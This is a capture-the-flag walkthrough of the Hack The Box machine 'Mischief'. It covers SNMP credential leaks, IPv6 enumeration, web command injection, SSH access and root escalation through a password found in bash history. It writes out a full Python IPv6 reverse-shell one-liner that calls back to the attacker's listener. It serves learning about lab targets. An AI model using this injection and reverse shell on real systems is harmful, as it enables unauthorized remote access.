---
title: "Hack The Box - Mischief"
tags: [linux,insane,snmp,ipv6,snmp-check,enyx,bash history, code injection]
categories: HackTheBox
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled.png)

## NMAP :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%201.png)

⇒ On [http://10.10.10.92:3366](http://10.10.10.92:3366) we have a http-authentication form. We dont have any credentials to login.

⇒ We ran udp port scan and found snmp open :

161/udp open snmp

## Enumerating SNMP :

→ Ran snmp-check and found the following :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%202.png)

**loki : godofmischiefisloki**

→ Using these credentials we were able to login on the caldav webpage :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%203.png)

→ More new credentials :

**loki : trickeryanddeceit**

⇒ Lets enumerate **ipv6** through **snmp**

Tool : [https://github.com/trickster0/Enyx](https://github.com/trickster0/Enyx)

**python [enyx.py](http://enyx.py/) 2c public 10.10.10.92**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%204.png)

`**dead:beef:0000:0000:0250:56ff:feb9:2353**`

⇒ Lets run nmap :

**nmap -6 -sV -sC -A dead:beef:0000:0000:0250:56ff:feb9:2353**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%205.png)

⇒ Webpage : http://[dead:beef::250:56ff:feb9:2353]/

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%206.png)

→ We logged in as user **administrator** with password **trickeryanddeceit**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%207.png)

⇒ We have command execution. It says that the password is stored in home directory :

→ Reading everything in loki home directory :

**cat /home/loki/* ;**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%208.png)

SSH : **loki : lokiisthebestnorsegod**

⇒ SSH'ed in as loki

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%209.png)

**USER OWNED**

## Privilege Escalation to Root

⇒ In user bash_history we find the following :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%2010.png)

→ Password : **lokipasswordmischieftrickery**

→ We tried switching to root using this password but it blocks the command. 

⇒ Lets get a shell as www-data through the web rce and then switch to root

→ Starting listener :

**ncat -6 -nlvp 4444**

→ Running command. [ Note : We are using our IPV6 address ]

**`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::102b",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ;`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%2011.png)

⇒ Switched to root using the password we found in bash_history :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Mischief%20Box%2063a8665538674a6daa134ef527fe48b2/Untitled%2012.png)

**ROOTED**

→ ***/root/root.txt*** says the flag is not here. So lets run find command :

**find / -type f -name root.txt**

